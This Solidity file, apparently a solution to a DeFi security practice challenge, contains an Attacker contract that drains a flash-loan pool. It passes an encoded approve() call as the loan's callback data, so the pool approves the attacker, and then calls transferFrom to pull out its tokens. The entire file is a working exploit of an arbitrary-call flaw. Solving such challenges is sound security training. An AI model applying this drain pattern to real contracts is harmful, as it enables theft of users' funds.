// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "hardhat/console.sol";
import "./TrusterLenderPool.sol";

/**
 * @title Attacker
 * @author Luciana Silva
 */
contract Attacker {
    function attack(
        address attacker,
        address pool,
        address token,
        uint256 amount
    ) external {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            amount
        );

        TrusterLenderPool(pool).flashLoan(0, attacker, token, data);

        IERC20(token).transferFrom(pool, attacker, amount);
    }
}
